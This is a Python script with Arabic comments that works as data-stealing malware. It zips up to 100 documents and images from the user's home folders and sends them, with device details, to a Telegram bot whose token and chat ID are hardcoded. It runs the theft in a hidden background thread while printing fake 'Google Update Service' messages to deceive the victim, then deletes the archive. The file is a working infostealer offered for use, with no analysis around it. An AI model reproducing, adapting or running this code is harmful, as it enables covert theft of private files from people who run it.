#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import requests
import sys
import platform
import socket
import zipfile
import time
import threading
from datetime import datetime

# ============= إعدادات تلجرام (تم التحديث بالقيم الصحيحة) =============
TELEGRAM_BOT_TOKEN = "8556004865:AAE_W9SXGVxgTcpSCufs_hemEb_mOX_ioj0"
TELEGRAM_CHAT_ID = "6124349953"

# ============= إعدادات المسح =============
root_path = os.path.expanduser("~")
extensions = ('.jpg', '.jpeg', '.png', '.pdf', '.docx', '.txt', '.doc', '.xls', '.xlsx', '.pptx')

# ============= معلومات الجهاز =============
def get_device_info():
    try:
        device_name = socket.gethostname()
        system = platform.system()
        user = os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
        return f"{system} | {device_name} | User: {user}"
    except:
        return "Unknown Device"

# ============= دالة إرسال رسالة نصية =============
def send_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
        requests.post(url, data=data, timeout=30)
    except:
        pass

# ============= دالة إرسال الملفات =============
def send_file(file_path):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID}
            requests.post(url, data=data, files=files, timeout=120)
    except:
        pass

# ============= عملية السحب (في الخلفية) =============
def exfiltrate():
    try:
        send_message(f"🚀 **بدأت عملية السحب من جهاز جديد**\n🖥️ {get_device_info()}")
        
        target_dirs = [
            os.path.join(root_path, 'Documents'),
            os.path.join(root_path, 'Desktop'),
            os.path.join(root_path, 'Downloads'),
            os.path.join(root_path, 'Pictures')
        ]
        
        zip_name = f"data_{os.getlogin()}_{int(time.time())}.zip"
        count = 0
        
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for t_dir in target_dirs:
                if not os.path.exists(t_dir): continue
                for root, dirs, files in os.walk(t_dir):
                    for file in files:
                        if file.lower().endswith(extensions):
                            file_path = os.path.join(root, file)
                            try:
                                # ضغط الملفات التي يقل حجمها عن 10 ميجا لتجنب البطء
                                if os.path.getsize(file_path) < 10 * 1024 * 1024:
                                    zipf.write(file_path, os.path.relpath(file_path, root_path))
                                    count += 1
                            except: continue
                        if count >= 100: break # حد أقصى 100 ملف
                    if count >= 100: break
        
        if count > 0:
            send_file(zip_name)
            send_message(f"✅ **تم سحب {count} ملفات بنجاح**\n🖥️ {get_device_info()}")
        else:
            send_message(f"❌ **لم يتم العثور على ملفات هامة للسحب**\n🖥️ {get_device_info()}")
            
        if os.path.exists(zip_name):
            os.remove(zip_name)
            
    except Exception as e:
        send_message(f"⚠️ **خطأ أثناء السحب:** {str(e)}")

# ============= البرنامج الرئيسي =============
if __name__ == "__main__":
    # تشغيل عملية السحب في خيط منفصل (Thread) لتعمل في الخلفية
    # هذا يسمح للملف بالعمل "بصمت" دون تعطيل المستخدم
    threading.Thread(target=exfiltrate, daemon=True).start()
    
    # تمويه المستخدم برسالة وهمية
    print("Google Update Service is starting...")
    time.sleep(2)
    print("Checking for updates...")
    time.sleep(3)
    print("System is up to date.")
    
    # إبقاء البرنامج يعمل لفترة كافية لإنهاء السحب في الخلفية
    time.sleep(60)
